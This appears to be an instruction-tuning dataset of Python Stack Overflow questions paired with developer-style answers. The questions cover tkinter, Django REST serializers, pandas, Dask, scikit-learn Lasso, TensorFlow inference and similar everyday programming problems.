{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Why get() method doesn't return any value?<pre><code>def Main_Menu():\n    for widget in myframe_1.winfo_children():\n        widget.destroy()\n    PostIt_Count = len([name for name in os.listdir('C:\/Users\/Aatu\/Documents\/python\/pythonleikit\/tkinterstuff\/PostItApp\/PostIts')])\n    if PostIt_Count &gt; 0:\n        for i in range(PostIt_Count):\n            PostIt_NamesList = [name for name in os.listdir('C:\/Users\/Aatu\/Documents\/python\/pythonleikit\/tkinterstuff\/PostItApp\/PostIts')]\n            global selected_postit\n            selected_postit = tk.StringVar()\n            PostIt_ButtonName = ttk.Radiobutton(myframe_1, text=PostIt_NamesList[i], variable=selected_postit)\n            y = ([x for x in range(1, PostIt_Count +1)][i])- 0.4\n            if PostIt_Count &lt; 10:\n                y = str(y)[:1] + str(y)[2:]\n            else:\n                y = str(y)[:2] + str(y)[3:]\n            yname = '.' + y\n            PostIt_ButtonName.place(relx=.1, rely=yname)\n\ndef Read_PostIt():\n    for widget in myframe_3.winfo_children():\n        widget.destroy()\n    filepath = 'C:\/Users\/Aatu\/Documents\/python\/pythonleikit\/tkinterstuff\/PostItApp\/PostIts\/'\n    postit = selected_postit.get()\n    print(postit)\n    f = filepath + postit\n    print(f)\n    os.chmod('C:\/Users\/Aatu\/Documents\/python\/pythonleikit\/tkinterstuff\/PostItApp\/PostIts\/', stat.S_IRWXO)\n    with open('{}'.format(f), 'r') as fi:\n        global text\n        text = fi.readlines()\n        fi.close()\n    text_label = Label(myframe_3, text='{}'.format(text))\n    text_label.place(relx=.01, rely=.01)\n<\/code><\/pre>\n<p>I'm doing a Post-It app. There are post-its listed as radiobuttons with the name of their filenames. The idea is that when I select a radiobutton and click Read-button, the Read_PostIt function would read the post-it file and show the text. However, when the selected_postit.get()  line should return me the name of the post-it, it doesn't return anything. ```print(postit)\u00b4\u00b4\u00b4 just prints an empty line. Why is this?<\/p>\n<p>Here is the output and traceback:<\/p>\n<pre><code>PS C:\\Users\\Aatu\\Documents\\python\\pythonleikit&gt; &amp; C:\/Python39ni\/python.exe c:\/Users\/Aatu\/Documents\/python\/pythonleikit\/tkinterstuff\/PostItApp\/post-its.py\n\nC:\/Users\/Aatu\/Documents\/python\/pythonleikit\/tkinterstuff\/PostItApp\/PostIts\/\nException in Tkinter callback\nTraceback (most recent call last):\n  File &quot;C:\\Python39ni\\lib\\tkinter\\__init__.py&quot;, line 1892, in __call__\n    return self.func(*args)\n  File &quot;c:\\Users\\Aatu\\Documents\\python\\pythonleikit\\tkinterstuff\\PostItApp\\post-its.py&quot;, line 77, in Read_PostIt\n    with open('{}'.format(f), 'r') as fi:\nPermissionError: [Errno 13] Permission denied: 'C:\/Users\/Aatu\/Documents\/python\/pythonleikit\/tkinterstuff\/PostItApp\/PostIts\/'\n<\/code><\/pre>\n<p>The program should add the name of the post-it at the end of its directory path but nothing appears at the end.<\/p>\n<p>Someone pls help.<\/p>","output_text":"<p>You're creating a new <code>StringVar<\/code> each time through the loop, so each radio button is tied to a different one. After the loop, <code>selected_postit<\/code> is the <code>StringVar<\/code> associated with the last radio button, not all of them.<\/p>\n<p>Create the <code>StringVar<\/code> once, and associate all the buttons with it.<\/p>\n<p>Another problem is that you didn't set the <code>value<\/code> of the radio buttons, so it's defaulting to its integer sequence in the group.<\/p>\n<pre><code>    if PostIt_Count &gt; 0:\n        global selected_postit\n        selected_postit = tk.StringVar()\n        for i in range(PostIt_Count):\n            PostIt_NamesList = [name for name in os.listdir('C:\/Users\/Aatu\/Documents\/python\/pythonleikit\/tkinterstuff\/PostItApp\/PostIts')]\n            PostIt_ButtonName = ttk.Radiobutton(myframe_1, text=PostIt_NamesList[i], value=PostIt_NamesList[i], variable=selected_postit)\n            y = ([x for x in range(1, PostIt_Count +1)][i])- 0.4\n            if PostIt_Count &lt; 10:\n                y = str(y)[:1] + str(y)[2:]\n            else:\n                y = str(y)[:2] + str(y)[3:]\n            yname = '.' + y\n            PostIt_ButtonName.place(relx=.1, rely=yname)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to handle application password in Git repo<p>I have to set up a ssh connection using python. I am using the pexpect module to which I need to pass user credentials.<\/p>\n\n<p>I keep my code in a Git repo. How can I handle the password?<\/p>\n\n<p>Should I - <\/p>\n\n<ol>\n<li>Encode it with baseurl64 or<\/li>\n<li>Keep it in the Jenkins password manager?<\/li>\n<\/ol>\n\n<p>What are the best standards you follow?<\/p>","output_text":"<p>You should not store secrets unencrypted in a Git repository.  Anyone who obtains a copy of that repository can get access to those secrets.  Even if the repository is private, sometimes unauthorized users get access to repositories, and you definitely want to limit the possible damage.<\/p>\n\n<p>Base64-encoding secrets does not hide them, so you should not use that option.  The best way to set up an SSH connection would be to generate a key without a passphrase and store it in your CI secret store, and then in your CI job saving it to a temporary file and using it with <code>ssh -i<\/code>.<\/p>\n\n<p>If that's not possible, you can use a password with your pyexpect option and store that in your CI secret store.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Django model serialization returns only primary key for foreign key<p>i am building blog site with Django. After serialization, the Post model which has a foreign key field of Django built-in User model, Post models are returned with the integer foreign key reference to the User model while i am expecting the whole User object data rather only getting the integer number.\nthe Post models.py:<\/p>\n<pre><code>from django.db import models\nfrom django.contrib.auth.models import User\nclass Post(models.Model):\n    author = models.ForeignKey(User,on_delete=models.CASCADE)\n    body = models.TextField()\n    created_at = models.DateTimeField(auto_now_add=True)\n    updated_at = models.DateTimeField(auto_now=True)\n<\/code><\/pre>\n<p>the serializers.py:<\/p>\n<pre><code>from rest_framework  import serializers\nfrom .models import Post\nclass PostSerializer(serializers.ModelSerializer):\n    class Meta:\n        fields = ('id', 'author','body','created_at')\n        model = Post\n\n<\/code><\/pre>\n<p>the views.py:<\/p>\n<pre><code>from django.shortcuts import render\nfrom rest_framework import generics\nfrom .models import Post\nfrom .serializers import PostSerializer\nfrom .permissions import IsAuthorOrReadOnly\n\nclass PostList(generics.ListCreateAPIView):\n    serializer_class = PostSerializer\n    queryset = Post.objects.all().order_by('-created_at')#sorted by created_at descending \n\nclass PostDetail(generics.RetrieveUpdateDestroyAPIView):\n    permission_classes = (IsAuthorOrReadOnly,)\n    serializer_class = PostSerializer\n    queryset = Post.objects.all()\n<\/code><\/pre>\n<p>i want<\/p>\n<pre><code> {\n        &quot;id&quot;: 15,\n        &quot;author&quot;: {&quot;fisrt_name&quot;:&quot;firstname&quot;,&quot;last_name&quot;:&quot;namelast&quot;,&quot;username&quot;:&quot;username1&quot;,&quot;email&quot;:&quot;example@gamil.com&quot;},\n        &quot;body&quot;: &quot;hello world2&quot;,\n        &quot;created_at&quot;: &quot;2020-12-23T13:53:17.741635Z&quot;\n    }\n<\/code><\/pre>\n<p>instead of<\/p>\n<pre><code> {\n        &quot;id&quot;: 15,\n        &quot;author&quot;: 21,\n        &quot;body&quot;: &quot;hello world2&quot;,\n        &quot;created_at&quot;: &quot;2020-12-23T13:53:17.741635Z&quot;\n    }\n<\/code><\/pre>","output_text":"<p>you can make your User Serializer like this:<\/p>\n<pre><code>class UserSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = User\n        fields = [...] # put your fields instead of &quot;...&quot;\n        depth = 1\n<\/code><\/pre>\n<p>and then use nested serializer like this :<\/p>\n<pre><code>class PostSerializer(serializers.ModelSerializer):\n    author = UserSerializer(many=false)\n    class Meta:\n        fields = ('id','body','created_at')\n        model = Post\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n generate sample of numbers within range random amount of times in chronological order<p>I have a list of 5000 ids, and I want to generate a number between<\/p>\n<pre><code>ids = range(1,5000)\nids = list(itertools.chain.from_iterable(itertools.repeat(x, 1) for x in ids)) \n<\/code><\/pre>\n<p>I want to add a new column with a number in chronological order between 1 and 50 per id. The number should occur a semi random amount of times, for instance like this<\/p>\n<p>The expected output should be something like<\/p>\n<pre><code>\na = [1] * 10\nb = [2] * 32\nc = [3] * 98\nd = [4] * 239\ne = [5] * 187\n.... \nxx = [50] * 2876\n\n<\/code><\/pre>\n<p>but i am sure there must be a better way<\/p>\n<p>Thank you!<\/p>","output_text":"<p>I could not comprehend your problem completely but I have a piece of code which I made by what I have understood.<\/p>\n<pre><code>import random\nrandom_list =[]\nfor i in range(1,51):\n    ids = random.randint(1,5001)\n    random_list.append(ids)\n    random_list.sort()\nprint (random_list)\nfor j in range(0,50):\n    \n    print(f&quot;[{j+1}] * {random_list[j]}&quot;)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n how to slice pandas dataframe columns with default values instead of error<p>I have a following set of dataframes<\/p>\n<pre><code>df1 = pd.DataFrame({'col1':[1234, 12345], 'col2':[123, 345], 'col3':[1000,1000] })\ndf2 = pd.DataFrame({'col1':[1234, 12345], 'col2':[123, 345], 'col3':[1000,1000], 'col4':[1000,1000] })\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/NabzJ.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/NabzJ.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>I am trying to slice them so that I only have <code>['col1', 'col3', 'col4']<\/code><\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/i47YH.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/i47YH.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>While I'm able to achieve that using slicing <code>df[['col1','col3', 'col4']]<\/code>, in the case that <code>col4<\/code> doesn't exist , it gives an error. Is it possible to put a default value e.g. <code>nil<\/code> or <code>0<\/code> in case col4 doesn't exist so that I get the following when I run slicing with df1?<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/6vMlG.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/6vMlG.png\" alt=\"enter image description here\" \/><\/a><\/p>","output_text":"<p>Use:<\/p>\n<pre><code>df = df.reindex(['col1','col3', 'col4'], axis=1)\n<\/code><\/pre>\n<p>Or:<\/p>\n<pre><code>df = df.reindex(['col1','col3', 'col4'], axis=1, fill_value=0)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Detect points upstream and downstream of an intersection between two curves<p>I have two curves, defined by<\/p>\n<pre><code>X1=[9, 10.5, 11, 12, 12, 11, 10, 8, 7, 7]\nY1=[-5, -3.5, -2.5, -0.7, 1, 3, 4, 5, 5, 5]\nX2=[5, 7, 9, 9.5, 10, 11, 12]\nY2=[-2, 4, 1, 0, -0.5, -0.7, -3]\n<\/code><\/pre>\n<p>They intersect each other\n<a href=\"https:\/\/i.stack.imgur.com\/nsXgI.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/nsXgI.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>and by a function which is written in the system code I am using, I can have the coordinates of the intersection.<\/p>\n<pre><code>loop1=Loop([9, 10.5, 11, 12, 12, 11, 10, 8, 7, 7],[-5, -3.5, -2.5, -0.7, 1, 3, 4, 5, 5, 5])\nloop2=Loop([5, 7, 9, 9.5, 10, 11, 12], [-2, 4, 1, 0, -0.5, -0.7, -3])\nx_int, y_int = get_intersect(loop1,loop2)\nIntersection = [[],[]]\nIntersection.append(x_int)\nIntersection.append(y_int)\n<\/code><\/pre>\n<p>for both curves, I need to find the points which are upstream and downstream the intersection identified by (x_int, y_int).<\/p>\n<p>What I tried is something like:<\/p>\n<pre><code>for x_val, y_val, x, y in zip(Intersection[0], Intersection[1], loop1[0], loop1[1]):\n    if  abs(x_val - x) &lt; 0.5 and abs(y_val - y) &lt; 0.5:\n        print(x_val, x, y_val, y)\n<\/code><\/pre>\n<p>The problem is that the result is extremely affected by the delta that I decide (0.5 in this case) and this gives me wrong results especially if I work with more decimal numbers (which is actually my case).<\/p>\n<p>How can I make the loop more robust and actually find all and only the points which are upstream and downstream the intersection?<\/p>\n<p>Many thanks for your help<\/p>","output_text":"<p>TL;TR: loop over poly line segments and test <a href=\"https:\/\/stackoverflow.com\/questions\/328107\/how-can-you-determine-a-point-is-between-two-other-points-on-a-line-segment\">if the intersection is betwwen the segment end points<\/a>.<\/p>\n<p>A more robust (than &quot;delta&quot; in OP) approach is to find a segment of the polyline, which contains the intersection (or given point in general). This segment should IMO be part of the <code>get_intersect<\/code> function, but if you do not have access to it, you have to search the segment yourself.<\/p>\n<p>Because of roundoff errors, the given point does not exactly lie on the segment, so you still have some <code>tol<\/code> parameter, but the results should be &quot;almost-insensitive&quot; to its (very low) value.<\/p>\n<p>The approach uses simple geometry, namely dot product and cross product and their geometric meaning:<\/p>\n<ul>\n<li><a href=\"https:\/\/en.wikipedia.org\/wiki\/Dot_product#Scalar_projection_and_first_properties\" rel=\"nofollow noreferrer\">dot product<\/a> of vector <code>a<\/code> and <code>b<\/code> divided by <code>|a|<\/code> is projection (length) of <code>b<\/code> onto the direction of <code>a<\/code>. Once more dividing by <code>|a|<\/code> normalizes the value to the range <code>[0;1]<\/code><\/li>\n<li><a href=\"https:\/\/en.wikipedia.org\/wiki\/Cross_product\" rel=\"nofollow noreferrer\">cross product<\/a> of <code>a<\/code> and <code>b<\/code> is <a href=\"https:\/\/en.wikipedia.org\/wiki\/Cross_product#Geometric_meaning\" rel=\"nofollow noreferrer\">the area of the parallelogram having a and b as sides<\/a>. Dividing it by square of length make it some dimensionless factor of distance. If a point lies exactly on the segment, the cross product is zero. But a small tolerance is needed for floating point numbers.<\/li>\n<\/ul>\n<pre class=\"lang-py prettyprint-override\"><code>X1=[9, 10.5, 11, 12, 12, 11, 10, 8, 7, 7]\nY1=[-5, -3.5, -2.5, -0.7, 1, 3, 4, 5, 5, 5]\nX2=[5, 7, 9, 9.5, 10, 11, 12]\nY2=[-2, 4, 1, 0, -0.5, -0.7, -3]\n\nx_int, y_int = 11.439024390243903, -1.7097560975609765\n\ndef splitLine(X,Y,x,y,tol=1e-12):\n    &quot;&quot;&quot;Function\n    X,Y ... coordinates of line points\n    x,y ... point on a polyline\n    tol ... tolerance of the normalized distance from the segment\n    returns ... (X_upstream,Y_upstream),(X_downstream,Y_downstream)\n    &quot;&quot;&quot;\n    found = False\n    for i in range(len(X)-1): # loop over segments\n        # segment end points\n        x1,x2 = X[i], X[i+1]\n        y1,y2 = Y[i], Y[i+1]\n        # segment &quot;vector&quot;\n        dx = x2 - x1\n        dy = y2 - y1\n        # segment length square\n        d2 = dx*dx + dy*dy\n        # (int,1st end point) vector\n        ix = x - x1\n        iy = y - y1\n        # normalized dot product\n        dot = (dx*ix + dy*iy) \/ d2\n        if dot &lt; 0 or dot &gt; 1: # point projection is outside segment\n            continue\n        # normalized cross product\n        cross = (dx*iy - dy*ix) \/ d2\n        if abs(cross) &gt; tol: # point is perpendicularly too far away\n            continue\n        # here, we have found the segment containing the point!\n        found = True\n        break\n    if not found:\n        raise RuntimeError(&quot;intersection not found on segments&quot;) # or return None, according to needs\n    i += 1 # the &quot;splitting point&quot; has one higher index than the segment\n    return (X[:i],Y[:i]),(X[i:],Y[i:])\n\n# plot\nimport matplotlib.pyplot as plt\nplt.plot(X1,Y1,'y',linewidth=8)\nplt.plot(X2,Y2,'y',linewidth=8)\nplt.plot([x_int],[y_int],&quot;r*&quot;)\n(X1u,Y1u),(X1d,Y1d) = splitLine(X1,Y1,x_int,y_int)\n(X2u,Y2u),(X2d,Y2d) = splitLine(X2,Y2,x_int,y_int)\nplt.plot(X1u,Y1u,'g',linewidth=3)\nplt.plot(X1d,Y1d,'b',linewidth=3)\nplt.plot(X2u,Y2u,'g',linewidth=3)\nplt.plot(X2d,Y2d,'b',linewidth=3)\nplt.show()\n<\/code><\/pre>\n<p>Result:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/owQKS.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/owQKS.png\" alt=\"enter image description here\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Use map with return value of soup.select to get table headers<p>I am using BeautifulSoup to parse a webpage.<\/p>\n<pre><code>from bs4 import BeautifulSoup as Soup\n<\/code><\/pre>\n<p>How do I get an array of strings from table headers like<\/p>\n<pre><code>soup = Soup(html, features=&quot;html.parser&quot;)\nheaders = soup.select(&quot;#StatusGrid thead tr&quot;).map(lambda x: x.text)\n<\/code><\/pre>\n<p>Select does not return a list. Can I inspect the type that it returns?<\/p>","output_text":"<p>Without any example of your html it is hard to help, you may can provide an url or some html. However, to generate your list <code>with map()<\/code> put the <code>list<\/code> inside.<\/p>\n<p>Alternativ use a <code>list comprehension<\/code>:<\/p>\n<pre><code>[x.text for x in soup.select(&quot;#StatusGrid thead tr&quot;)]\n<\/code><\/pre>\n<p>Checking the type will give you <code>bs4.element.ResultSet<\/code>:<\/p>\n<pre><code>type(soup.select(&quot;#StatusGrid thead tr&quot;)) \n<\/code><\/pre>\n<h3>Example<\/h3>\n<pre><code>from bs4 import BeautifulSoup as Soup\nhtml='''\n&lt;table id=&quot;StatusGrid&quot;&gt;\n&lt;thead&gt;\n&lt;tr&gt;&lt;td&gt;1&lt;\/td&gt;&lt;\/tr&gt;\n&lt;tr&gt;&lt;td&gt;2&lt;\/td&gt;&lt;\/tr&gt;\n&lt;tr&gt;&lt;td&gt;3&lt;\/td&gt;&lt;\/tr&gt;\n&lt;\/thead&gt;\n&lt;\/table&gt;\n'''\n\nsoup = Soup(html, features=&quot;html.parser&quot;)\nlist(map(lambda x: x.text, soup.select(&quot;#StatusGrid thead tr&quot;)))\n<\/code><\/pre>\n<h3>Output<\/h3>\n<pre><code>['1', '2', '3']\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python: recursive method returns different results when it is a class method<p>I have a recursive function that works as expected when it is a standalone function<\/p>\n\n<pre><code>def drip2(n, \n          i: float = 0.0, \n          j: float = 0.0) -&gt; float:\n    return ((1 + i * (1 + j) ** (n - 1) \/ 4) ** 4 * drip2(n - 1) \n        if n &gt; 1 else (1 + i \/ 4) ** 4)\n\ndrip2(0, 0.0067, 0.2) = drip2(1, 0.0067, 0.2) -&gt; 1.0067168525555594\ndrip2(2, 0.0067, 0.2) -&gt; 1.0080642730987266\n<\/code><\/pre>\n\n<p>However, when I wrap it in a class, the results differ. <\/p>\n\n<pre><code>class TestDrip:\n    def __init__(self, \n                 i: float = 0.0, \n                 j: float = 0.0) -&gt; None:\n        self.i = i\n        self.j = j\n\n    def drip(self,\n             n) -&gt; float:\n        return ((1 + self.i * (1 + self.j) ** (n - 1) \/ 4) ** 4 * self.drip(n - 1) \n            if n &gt; 1 else (1 + self.i \/ 4) ** 4)\n\nTestDrip(0.0067, 0.2).drip(1) = TestDrip(0.0067, 0.2).drip(1) -&gt; 1.0067168525555594\nTestDrip(0.0067, 0.2).drip(2) -&gt; 1.014835292187658\n<\/code><\/pre>\n\n<p>Once the integer n is greater than or equal to 2, the result deviate. I am on Python 3.7.7.<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/FbMxy.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/FbMxy.png\" alt=\"enter image description here\"><\/a><\/p>","output_text":"<p>In the definition of <code>drip2<\/code>, the recursive call you are doing is:<\/p>\n\n<pre class=\"lang-py prettyprint-override\"><code>drip2(n - 1)\n<\/code><\/pre>\n\n<p>which is equivalent to:<\/p>\n\n<pre class=\"lang-py prettyprint-override\"><code>drip2(n - 1, 0, 0)\n<\/code><\/pre>\n\n<p>while in the method <code>drip<\/code>, the recursive call is:<\/p>\n\n<pre class=\"lang-py prettyprint-override\"><code>self.drip(n - 1)\n<\/code><\/pre>\n\n<p>Since <code>self<\/code> refers to the same instance, <code>self.i<\/code> and <code>self.j<\/code> will stay at the same value throughout all recursive calls, while they are set to 0 starting from the first recursive call in your function definition.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Dask warning provide an explicit output types<p>I am performing the following operation using Dask.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>    import dask.dataframe as dd\n    import pandas as pd\n    \n    salary_df = pd.DataFrame({&quot;Salary&quot;:[10000, 50000, 25000, 30000, 7000]})\n    salary_category = pd.DataFrame({&quot;Hi&quot;:[5000, 20000, 25000, 30000, 90000],\n                            &quot;Low&quot;:[0,  5001, 20001, 25001, 30001],\n                            &quot;category&quot;:[&quot;Very Poor&quot;, &quot;Poor&quot;, &quot;Medium&quot;, &quot;Rich&quot;, &quot;Super Rich&quot; ]\n                            })\n    sal_ddf = dd.from_pandas(salary_df, npartitions=10)\n    salary_category.index = pd.IntervalIndex.from_arrays(salary_category['Low'],salary_category['Hi'],closed='both')\n    sal_ddf['Category'] = sal_ddf['Salary'].apply(lambda x : salary_category.iloc[salary_category.index.get_loc(x)]['category'])\n<\/code><\/pre>\n<p>I do get the results but there is a warning on the line below<\/p>\n<pre><code>      sal_ddf['Category'] = sal_ddf['Salary'].apply(lambda x : salary_category.iloc[salary_category.index.get_loc(x)]['category'])\n\n    You did not provide metadata, so Dask is running your function on a small dataset to guess output types. It is possible that Dask will guess incorrectly.\n    To provide an explicit output types or to silence this message, please provide the `meta=` keyword, as described in the map or apply function that you are using.\n      Before: .apply(func)\n      After:  .apply(func, meta=('Salary', 'object'))\n\n<\/code><\/pre>\n<p>What am I missing here ?<\/p>","output_text":"<p>The missing keyword argument here is <code>meta<\/code>. Dask generates an automatic suggestion (in the warning message):<\/p>\n<pre><code>  After:  .apply(func, meta=('Salary', 'object'))\n<\/code><\/pre>\n<p>As this is a warning message, for many use cases specifying <code>meta<\/code> is optional, but could be useful if you want to be explicit about the <code>dtype<\/code> of the calculated variables.<\/p>\n<p>Running the snippet below should not generate the warning message:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code># extracted your code into `func` for readability only\nfunc = lambda x: salary_category.iloc[salary_category.index.get_loc(x)]['category']\n\nsal_ddf['Category'] = sal_ddf['Salary'].apply(func, meta=('Salary', 'object'))\n<\/code><\/pre>\n<p>For more details this link might be useful: <a href=\"https:\/\/docs.dask.org\/en\/stable\/dataframe-design.html\" rel=\"nofollow noreferrer\">meta<\/a>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n getting negarive r squared with lasso regression, python<p>I did lasso regression but I got the negative R squared. Here my coding:<\/p>\n<pre><code>X = df.drop('var', axis=1)\ny = df['var']\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.25, random_state=10)\nreg = Lasso(alpha=0.5)\nreg.fit(X_train, y_train)\nlambdas = (0.001, 0.01, 0.1, 0.5, 1, 2, 10)\nl_num = 7\npred_num = X.shape[1]\n\n# prepare data for enumerate\n\ncoeff_a = np.zeros((l_num, pred_num))\ntrain_r_squared = np.zeros(l_num)\ntest_r_squared = np.zeros(l_num)\n\n# enumerate through lambdas with index and i\nfor ind, i in enumerate(lambdas):    \n    reg = Lasso(alpha = i)\n    reg.fit(X_train, y_train)\n\n    coeff_a[ind,:] = reg.coef_\n    train_r_squared[ind] = reg.score(X_train, y_train)\n    test_r_squared[ind] = reg.score(X_test, y_test)\n<\/code><\/pre>\n<p>When I print  <code> test_r_squared[ind]<\/code>  I am getting  -0.8086 .<\/p>\n<p>Why it is? Any help would be appreciated. Thanks.<\/p>","output_text":"<p><strong>It's not impossible to get an R^2 value less than 0.<\/strong><\/p>\n<p>R^2 is a metric used to measure the performance of a regressor. The optimal score of R^2 metric is <code>1<\/code>. If any regressor predicts a constant value, you should expect an R^2 score of <code>0<\/code> for that regressor. But unexpectedly, you can get worse performance than that. That's because:<\/p>\n<p>R^2 is given by:<\/p>\n<pre><code>R^2 = 1-FVU\n<\/code><\/pre>\n<p>Where, FVU (Fraction of Variance Unexplained) is the ratio of residual sum of squares and the variance of data. So, when your residual sum of squares is greater than the variance of the data, you should expect FVU&gt;1, hence an R^2 value <em>less than 0<\/em>. It may happen when you choose a wrong model, or nonsensical parameters.<\/p>\n<p>In short, you may get an R^2 score <em>less than 0<\/em>. It means you have chosen wrong model or parameters.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Feeding an image into an already trained TensorFlow CNN<p>I am somewhat new to Python and very new to TensorFlow. I have followed a couple tutorials and I am stuck on this <a href=\"https:\/\/colab.research.google.com\/github\/lmoroney\/dlaicourse\/blob\/master\/Course%202%20-%20Part%208%20-%20Lesson%202%20-%20Notebook%20(RockPaperScissors).ipynb#scrollTo=ZABJp7T3VLCU\" rel=\"nofollow noreferrer\">colab<\/a> with this <a href=\"https:\/\/www.youtube.com\/watch?v=u2TjZzNuly8\" rel=\"nofollow noreferrer\">video<\/a>. Training ran perfectly and I have a saved model. Now I want to load that model and feed one of my own images into it. Here is my attempt:<\/p>\n<pre><code>import tensorflow as tf\nimport cv2\nfrom tensorflow import keras\nmodel = tf.keras.models.load_model('rps.h5')\nmodel.summary()\n\nimg = cv2.imread('my_hand_paper.png')\nprint(model.predict_classes(img))\n<\/code><\/pre>\n<p>but I get the following error:<\/p>\n<pre><code>ValueError: Input 0 of layer sequential is incompatible with the layer: expected ndim=4, found ndim=3. Full shape received: [None, 300, 3]\n<\/code><\/pre>\n<p>My image is 300x300 just like the training images. I imagine the problem is that I have to prepare the image in a similar way to the training data, but I am unsure how. This is how the training data was prepared:<\/p>\n<pre><code>training_datagen = ImageDataGenerator(\n  rescale = 1.\/255,\n  rotation_range=40,\n  width_shift_range=0.2,\n  height_shift_range=0.2,\n  shear_range=0.2,\n  zoom_range=0.2,\n  horizontal_flip=True,\n  fill_mode='nearest')\n\ntrain_generator = training_datagen.flow_from_directory(\n  TRAINING_DIR,\n  target_size=(150,150),\n  class_mode='categorical',\n  batch_size=126)\n<\/code><\/pre>\n<p>Output from summary():<\/p>\n<pre><code> Model: &quot;sequential&quot;\n_________________________________________________________________\nLayer (type)                 Output Shape              Param #   \n=================================================================\nconv2d (Conv2D)              (None, 148, 148, 64)      1792      \n_________________________________________________________________\nmax_pooling2d (MaxPooling2D) (None, 74, 74, 64)        0         \n_________________________________________________________________\nconv2d_1 (Conv2D)            (None, 72, 72, 64)        36928     \n_________________________________________________________________\nmax_pooling2d_1 (MaxPooling2 (None, 36, 36, 64)        0         \n_________________________________________________________________\nconv2d_2 (Conv2D)            (None, 34, 34, 128)       73856     \n_________________________________________________________________\nmax_pooling2d_2 (MaxPooling2 (None, 17, 17, 128)       0         \n_________________________________________________________________\nconv2d_3 (Conv2D)            (None, 15, 15, 128)       147584    \n_________________________________________________________________\nmax_pooling2d_3 (MaxPooling2 (None, 7, 7, 128)         0         \n_________________________________________________________________\nflatten (Flatten)            (None, 6272)              0         \n_________________________________________________________________\ndropout (Dropout)            (None, 6272)              0         \n_________________________________________________________________\ndense (Dense)                (None, 512)               3211776   \n_________________________________________________________________\ndense_1 (Dense)              (None, 3)                 1539      \n=================================================================\nTotal params: 3,473,475\nTrainable params: 3,473,475\nNon-trainable params: 0\n_________________________________________________________________\n<\/code><\/pre>","output_text":"<p>When you want to use your network in inference, you still have to use a batch size. In your case, the batch size is 1.<\/p>\n<p>You can add the batch with the following code:<\/p>\n<pre><code>img = cv2.resize(img, (150,150))    \nimg = tf.expand_dims(img , 0)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Generate a list of urls with two f-string substitutions in Python<p>I am trying to generate a list of urls by looping two word lists. I can do it one through f-string but I am not so sure how to do two at the same time. Any suggestion?<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>tag_names = ['business', 'science', 'technology']\ndomain_names = ['bbc', 'cnn', 'nytimes']\n\nfor domain in domain_names:\n    print(f'www.{domain}.com\/{tag}')\n<\/code><\/pre>\n<p>Expected result<\/p>\n<pre><code>www.bbc.com\/business\nwww.bbc.com\/science\nwww.bbc.com\/technology\nwww.cnn.com\/business\nwww.cnn.com\/science\nwww.cnn.com\/technology\nwww.nytimes.com\/business\nwww.nytimes.com\/science\nwww.nytimes.com\/technology\n<\/code><\/pre>","output_text":"<p>You can use <code>itertools.product<\/code> and a list comprehension:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import itertools\n\ntag_names = ['business', 'science', 'technology']\ndomain_names = ['bbc', 'cnn', 'nytimes']\n\n[f'www.{domain}.com\/{tag}' for domain, tag in itertools.product(domain_names, tag_names)]\n<\/code><\/pre>\n<p>output:<\/p>\n<pre><code>['www.bbc.com\/business',\n 'www.bbc.com\/science',\n 'www.bbc.com\/technology',\n 'www.cnn.com\/business',\n 'www.cnn.com\/science',\n 'www.cnn.com\/technology',\n 'www.nytimes.com\/business',\n 'www.nytimes.com\/science',\n 'www.nytimes.com\/technology']\n<\/code><\/pre>"}
